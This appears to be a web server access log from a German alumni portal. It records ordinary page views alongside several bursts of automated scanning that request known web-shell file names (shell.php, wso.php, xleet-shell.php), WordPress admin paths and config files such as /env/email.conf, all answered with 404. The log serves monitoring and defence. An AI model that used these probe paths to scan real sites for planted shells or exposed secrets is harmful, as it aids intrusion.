2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:11;;/classwithtostring.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:11;;/image.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:12;;/wp-admin/wp-conflg.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:13;;/mail.php?;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:14;;/sx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:15;;/max.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:16;;/size.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:16;;/mpxct.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:17;;/0xx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:18;;/s.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:19;;/hq.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:20;;/blox.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:20;;/ant.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:21;;/fso.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:22;;/htaccess.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:23;;/wp-trackback.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:24;;/wp-admin/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:24;;/readme.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:25;;/v.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:26;;/sck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:27;;/X7x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:28;;/xpass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:29;;/bless.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:29;;/bless2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:30;;/bless6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:31;;/bless10.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:32;;/bless11.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:33;;/wp-admin/js/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:33;;/thoms.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:34;;/xsas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:35;;/xrp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:36;;/wp-freya.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:37;;/css/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:37;;/file30.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:38;;/fesa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:39;;/class-.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:40;;/.well-known/gecko-litespeed.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:40;;/up.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:41;;/403.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:42;;/9v6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:43;;/lte7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:44;;/1vbqo.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:44;;/l10n.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:45;;/tajj.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:46;;/fdd2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:47;;/class9.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:48;;/sto.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:48;;/7h.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:49;;/fh26.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:50;;/ixj.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:51;;/x23.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:52;;/zeu.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:53;;/f2r4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:53;;/lopst.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:54;;/gecko.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:55;;/0xs.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:56;;/Zeiss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:56;;/x0x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-04 07:18:57;;/adin.php;GET;404
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-04 07:20:36;/;/;GET;200
91f02f323ebaa1cdad2b838a058bb149c4dc5e4866b6ac7bcad483a64177d334;2025-11-04 07:26:04;;/personen/alumni/schule/40745;GET;200
4acfa5cca50b228469e5889dc52263789fc0cb1ade145373d3606e3525de9b82;2025-11-04 07:33:04;;/personen/alumni/schule/5820;GET;200
cf576883a5c2a5d089119cb8f8b12bb3c44ed2c41c02b64a1a6a6f7c1d1a23a4;2025-11-04 07:38:54;;/personen/alumni/schule/MP003;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-04 07:40:05;/personen/alumni/schule/4440012;/personen/alumni/schule/610021;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-04 07:41:29;/personen/alumni/schule/4440012;/personen/alumni/schule/600027;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 07:42:48;/personen/all/3;/personen/alumni/schule/04A06;GET;200
47ca1675ba59e94ff27b91bacf52f3d53221f15cb9a405cb7e9b36b96754c297;2025-11-04 07:43:47;;/personen/alumni/schule/4240545;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-04 07:43:50;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
d9230b242272a97d66dd784170cf46ebc7221fa29cc512d1e9625b8bf0f30a1e;2025-11-04 07:45:36;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-04 07:45:50;/;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-04 07:45:56;;/;GET;200
aa3b60eb8f10272f891e043e8b031c3f06c062e0331438b5508746f1724aff2a;2025-11-04 07:48:38;;/personen/alumni/schule/5503;GET;200
66f38ba5bded8243c1250c2212235e65072da331be823192e067c40e4d036754;2025-11-04 07:51:30;;/gruppen/hobby/debattieren;GET;200
965233b4291566a84b71b3341e4111933e8bc92fafe629625dc89c9436d117c0;2025-11-04 07:53:23;;/personen/alumni/schule/5508;GET;200
be707718164886078eef3bb5d1cd050775bdeb335a5d1f4c4e84f33e0afb33d6;2025-11-04 07:57:21;;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:30;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:32;/themen/details/bucher-auf-dem-abstellgleis;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:34;/;/personen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:39;/personen;/personen/all/2;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:41;/personen/all/2;/personen/all/3;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:43;/personen/all/3;/personen/all/4;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:45;/personen/all/4;/personen/all/5;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:49;/personen/all/5;/personen/all/3;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-04 07:57:51;/personen/all/3;/;GET;200
4cfb6ca9de617eec846e55bb8a06552b36acebffa9dd55728e774c3f8e59b7dc;2025-11-04 07:57:56;;/personen/alumni/schule/5511;GET;200
18764a9ccdbe0ff5d19b17905c7c3035d77cf9d06eedaed30867a9a28dd0de52;2025-11-04 08:02:12;;/personen/alumni/schule/4440541;GET;200
bace9fc646a65d6c29f5e69bdbeceae2c9c1f594cf2297c9d7f9724a9d94c9f4;2025-11-04 08:07:09;;/personen/alumni/schule/170690;GET;200
bbacdf32d116fb3c5de03954353e552b49330fa0dd9ec273a606c8c0fb25a435;2025-11-04 08:11:36;;/;GET;200
fad3a0f100920dcb7404bae8c04f5525f428a7150c3a5119c1e2aa2fd5f5d65e;2025-11-04 08:12:02;;/personen/alumni/schule/5501;GET;200
0cdfa8fe8c058edb07e77483bf56f749b1c286940bb92d659bfa1cfdad550b57;2025-11-04 08:13:00;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
99d457fc5da9cd9bc9fdff44be1492801edc3bceed987b915b99dc214aeb79ad;2025-11-04 08:16:58;;/personen/alumni/schule/5506;GET;200
9c80df6fbde707e0e8a289bb5f2de9709c458061abb2df8165eed9723bbabccf;2025-11-04 08:22:00;;/aktuelles/meldungen?category=wissenschaft;GET;200
6a5e53d6805206cb662e9a29c9b1c89932da0a1e0e0189d1cf17481ff913af7b;2025-11-04 08:26:20;;/;GET;200
005eeb9e3808efc8cf27798f71d9d4d87b418b5d19b03bde4db345df4e457154;2025-11-04 08:26:48;;/personen/alumni/schule/4340014;GET;200
f1b5be8e7a2013225e7d5ab85a0b707e7caa9fae69cb50354cfcb27d674d2048;2025-11-04 08:32:13;;/personen/alumni/schule/59000;GET;200
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-04 08:33:21;;/;GET;200
ed54e213b53312161666046a0dc4417238e1d60595ea7addc5ce88eb4cb54c9c;2025-11-04 08:37:15;;/personen/alumni/schule/65262;GET;200
a90af479bd045b3f0e04d85f562a143e716d3a6432a40d24e753da352ee244c2;2025-11-04 08:42:09;;/;GET;200
33055fc24837cf6dbf7a8bb8b74f7bb4ea833b8bdd2d4a88b646f9e2969f0f85;2025-11-04 08:42:13;;/personen/alumni/schule/5505;GET;200
1e8728677d4c953b723a1fc6ddcadefd8cc96cc5db939c175414b34555ec1911;2025-11-04 08:43:24;;/;GET;200
c9497f56e9008e4e1c110ae702984eff9772984ef70c911f4b24264e339ba064;2025-11-04 08:47:15;;/personen/alumni/schule/170720;GET;200
a2c6cd2557f53b9c1ed7618e8c6228510a93a7c34d6d21c38d2b6067338c1bcd;2025-11-04 08:48:59;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
bc5eb9c146b3d4a66a3879467c2b8ade95ef46e702065375649ade18ce33991c;2025-11-04 08:52:05;;/personen/alumni/schule/4240404;GET;200
e14ec4ae5676322ea02845291bfd79c9fafe1829b4744e03024c7e35050fa0de;2025-11-04 08:56:58;;/docs/img/fiplan.png;GET;404
659f36bdb5688255303bec2f63b21d8676040b9b090f19c5f9149b5b28969087;2025-11-04 08:57:08;;/veranstaltungen;GET;200
0ade572e6b522ddcb8a16426e0ae35809fe803a1646eea32795ec153a6ba832c;2025-11-04 08:57:22;;/personen;GET;200
0ade572e6b522ddcb8a16426e0ae35809fe803a1646eea32795ec153a6ba832c;2025-11-04 08:57:48;;/pers;GET;404
85538dd3ea5c21218b307dc942e2141ddefa33364bc61a5d77427e0588c9bf58;2025-11-04 09:02:11;;/personen/alumni/schule/59013;GET;200
d0daffc238918c25964f139056e8d4b808a085ebbe5bf6901d46e998539e5e04;2025-11-04 09:03:57;;/;GET;200
d2ed00d18095a8f4241852add2e14312cd7771bbc27cc9c8129941de88e98306;2025-11-04 09:05:30;/themen/details/wenn-sicherheit-sichtbar-wird;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
36ab4280e6b98cfcd54f21b9119edc3bc255825be2992edc3b7ebbb75f43994d;2025-11-04 09:06:52;;/personen/alumni/schule/190627;GET;200
c59b51e8fe46fda721c0b46320a60ad90add930500539cc213bc2f8294ee755b;2025-11-04 09:09:59;;/themen/details/abschied-aus-moabit;GET;200
63aa6967a8fbe32543be9e795a15cb6e5390323a50ab6b24715f4512a02399a1;2025-11-04 09:12:06;;/personen/alumni/schule/191073;GET;200
e7217be5f85f7a5972a04fac8dc44d6b967672d1e884cfb6d756e4e7eb38ff00;2025-11-04 09:17:13;;/personen/alumni/schule/190962;GET;200
ba22318641b9be51af1f365f268e99f187eedbf1cdbc59ca42dc2b3bd7dd5b3f;2025-11-04 09:17:50;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-04 09:19:04;;/env/email.conf;GET;404
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-04 09:19:38;;/aktuelles/stellenangebote;GET;200
3f3382d4710026f57297c9c6b509e08f9f73954e2e695dad73aa14cad66908c3;2025-11-04 09:22:17;;/personen/alumni/schule/610021;GET;200
3856f342850ff5e30b7141f44ef12654db1351fae76e7b151590312575250d38;2025-11-04 09:22:33;;/aktuelles/stellenangebote;GET;200
f0c3aafa2979d3e013ac78f451319a4cea70dccda4157b9bd8e88fea676d3e0e;2025-11-04 09:25:27;;/;GET;200
564be8e6dfaf1ce22b1adfaf9010c4aa2a802f9c1fdc71d701c6a6887c91d852;2025-11-04 09:27:15;;/personen/alumni/schule/65286;GET;200
03db25e8e57c2d694090b1d250862626844e01753f63bfb02286aee2a8880e63;2025-11-04 09:28:25;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
d6b45c62b50a2ef9d70124e7c3e5c34d6934685c7ae585e7964962ea4d5e1dd4;2025-11-04 09:29:47;/;/;GET;200
a269e76bd113773abf6f3feae69b7f3c7e11c0c23651a1a0d9b157a9b888dcec;2025-11-04 09:32:18;;/personen/alumni/schule/5504;GET;200
6afeb3c78b7d23cffc1fb430487c7e5d18b3536aee5b61d972b4da6bfcdafc0f;2025-11-04 09:36:11;;/gruppen;GET;200
41caaff4a9d396b21f473ad5bec32722ccfaa027b4b1cb15b19f0a7d4c60007b;2025-11-04 09:40:50;;/personen/alumni/schule/40745;GET;200
6c339520a1aba428a6c5de612428f9919ae0ff1958bbb3174c0befbd65314a27;2025-11-04 09:41:58;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
b91a07f0a13d04a47951d341034c0c130e8bad5ef664a6dd6d6d528c0772c4d8;2025-11-04 09:42:30;;/personen/alumni/details/benjamin-voigt;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-04 09:43:50;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/shell.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/wso.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/xleet-shell.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/xleet.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/admin.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:40;;/admin-header.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:41;;/profile.php;GET;404
9a8894266115f707749cb80bf69aaa985119aef4128680147522541026c3c54d;2025-11-04 09:45:41;;/options-reading.php;GET;404
dfe33627757a7f6208e6987c07cf9d928bea45e6772d977ce908314307a0bdbf;2025-11-04 09:47:26;;/;GET;200
702a5732dbbfd6c9e387a03d7afd1b9acaf0fd9051aadfca66bbe58bfdf30dd2;2025-11-04 09:49:22;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
ff20ab82d98cea089373535ed72c0401a13fbc83a9d7c6c2162ba4ff8079a9cf;2025-11-04 09:51:59;;/personen/alumni/schule/5820;GET;200
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/options-reading.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/admin-header.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/wso.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/shell.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/xleet.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/profile.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/admin.php;GET;404
881736120d11cf6976751c804db94ba2f40033402a7cad1f04a32cda67e05243;2025-11-04 09:55:22;;/xleet-shell.php;GET;404
2adb54f59cba46fd351a344d02f4730ca6cdb248eff94d3eb62b1c082c0ee3b8;2025-11-04 09:57:01;;/themen?category=community;GET;200
d29413af965ab2a4b61e27eed37b523c3e812ad8f6979a9762fce99a46da554b;2025-11-04 09:57:24;;/wso.php;GET;404
d29413af965ab2a4b61e27eed37b523c3e812ad8f6979a9762fce99a46da554b;2025-11-04 09:57:24;;/shell.php;GET;404
d29413af965ab2a4b61e27eed37b523c3e812ad8f6979a9762fce99a46da554b;2025-11-04 09:57:24;;/xleet.php;GET;404
d29413af965ab2a4b61e27eed37b523c3e812ad8f6979a9762fce99a46da554b;2025-11-04 09:57:24;;/xleet-shell.php;GET;404
d29413af965ab2a4b61e27eed37b523c3e812ad8f6979a9762fce99a46da554b;2025-11-04 09:57:25;;/admin-header.php;GET;404
8d230ae09a6af8e660bd7d6f80386ea4181d5032413a79f68f921296f2ac3821;2025-11-04 10:00:50;;/personen/alumni/schule/MP003;GET;200
5f180a1a78671703bedbb0db07fd88f57144c7c9056c840918ddd890e3cc9a8b;2025-11-04 10:05:03;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
644ffd1a9f5a8c84ad7512e2b2d49d9acb2bef8053f28369e245b860feb5b921;2025-11-04 10:09:41;;/personen/alumni/schule/4240545;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-04 10:16:56;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
6c837b717bd565de354a48ecad79375ad9b432da0100048aedafae240f7b534a;2025-11-04 10:17:05;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
7cc60d7b97d063e4a89be5a6392362cc59b5e6039b0cc5c67cf6149fe603a772;2025-11-04 10:17:45;;/personen/alumni/schule/09A05;GET;200
49bb50471368ef6ab5253d77b9ac0c9be74fb190bfd48f18270166ca9ed46484;2025-11-04 10:19:42;/;/;GET;200
4be85216f05427d3d925da3170f4c05f8052bb0905e568be7de5d82aae32c3b5;2025-11-04 10:24:53;;/;GET;200
c991efdb88be0258f086ab50cd03592e02a0f07efda2478b2606aeadf72327f2;2025-11-04 10:25:13;;/themen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
1a46564b9bef786923e854e72b06f6de5fb37facef53e9a8572bd0176301530a;2025-11-04 10:26:11;;/personen/alumni/schule/170574;GET;200
af64914908e5b5eb72718732b6f1cbbb5d4729c5c91c79913b4418cac0123d5f;2025-11-04 10:34:45;;/;GET;200
ae5e7522f1997b8e059dc90445ce0a457490d0b139f512a690c1cdbe70982a55;2025-11-04 10:36:28;;/aktuelles/meldungen?category=wissenschaft;GET;200
02c7f07950ea476df86662d4d439ae896002b84f0776095b4c9625bf88a280a3;2025-11-04 10:40:07;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
fdb6f938beefceffefb71830fa3dbcc41b0ca6f648546d729d439bc8ccd91c03;2025-11-04 10:43:56;;/personen/alumni/schule/0348;GET;200
74191e7c16c31dea0432e7bc48a448ef13312f990d96d6bc1e0f8c4442655435;2025-11-04 10:43:57;;/;GET;200
74191e7c16c31dea0432e7bc48a448ef13312f990d96d6bc1e0f8c4442655435;2025-11-04 10:44:18;;/js;GET;404
134cba92c18851f657be36af57bada7907c8ddde6c4ca4e1cdf66bcb33876a57;2025-11-04 10:50:49;;/themen/details/der-start-ins-studium;GET;200
37ab117ac1def40a706fb288ec0a5360e78e85eb7c0830ae4fa59d2f278571e0;2025-11-04 10:50:56;;/personen/alumni/schule/5503;GET;200
229bb204f936d36e45f2500c87ec8b6034d1ff638640d2f805148bc472337f67;2025-11-04 10:57:53;;/personen/alumni/schule/5508;GET;200
b0b6fe22ae5d4a824b35dfb27c83c536faae3dadeafeed612608184ef98a5851;2025-11-04 11:00:52;;/personen/alumni/schule/5508;GET;200
fafc2eeb8b6c80fee545b5fe8d783e6431ccac97366e533ba30e9f53aed280d5;2025-11-04 11:05:00;;/personen/alumni/schule/5511;GET;200
c3b7174ba0bda4b3666f777a2344a4031dadb625165fd5b78ad6b79dc9cfd499;2025-11-04 11:08:33;/;/;GET;200
036b24aba44e75e3b0d7b628d9b90fcbb53e956d2b4df5bdf8107348a3f0a1b1;2025-11-04 11:09:10;;/;GET;200
bfe0688989e978134b35d38153037db5e6c4653180899a3456d8e0ec6068d264;2025-11-04 11:12:10;;/personen/alumni/schule/4440541;GET;200
8affb5828293a93baf748217ab3b9089421340aad9719809eb133c1e6c8df4c7;2025-11-04 11:15:37;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-04 11:18:23;;/;GET;200
25576493046f1fc60ab3aa018d14aa13c7138038bf43c3eb87b22c60881e8d1a;2025-11-04 11:19:11;;/personen/alumni/schule/170690;GET;200
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:34;;//wp-includes/ID3/license.txt;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:35;;//feed/;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:36;;//xmlrpc.php?rsd;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:36;;//blog/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:36;;//web/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:36;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:37;;//wp/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:37;;//2020/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:37;;//2019/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:38;;//2021/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:38;;//shop/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:38;;//wp1/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:38;;//test/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:39;;//site/wp-includes/wlwmanifest.xml;GET;404
3b64e618274fa71341e7ef9a37ce880b58bd5775700775972c67d4b85e22e6b2;2025-11-04 11:25:39;;//cms/wp-includes/wlwmanifest.xml;GET;404
368985243b10e4e4a0edbbd1e4a3ff4f6ec23767caf8ed5cb71bae94c0d9cf03;2025-11-04 11:25:59;;/personen/alumni/schule/5501;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 11:31:56;;/personen/alumni/schule/5511;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-04 11:31:59;;/;GET;200
f7fd82ddea8021310ff5df41ce5eb9eafef6cc35bec61e9e6fb076a1a8e59b54;2025-11-04 11:32:48;;/personen/alumni/schule/5506;GET;200
9ca84a0ecac52bfb4cdb853dc83b6b5b244ce2b2ea5b6666cee4cecc138dd231;2025-11-04 11:35:33;;/;GET;200
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:00;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:01;;/ws.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:01;;/.well-known/ws.php;GET;404
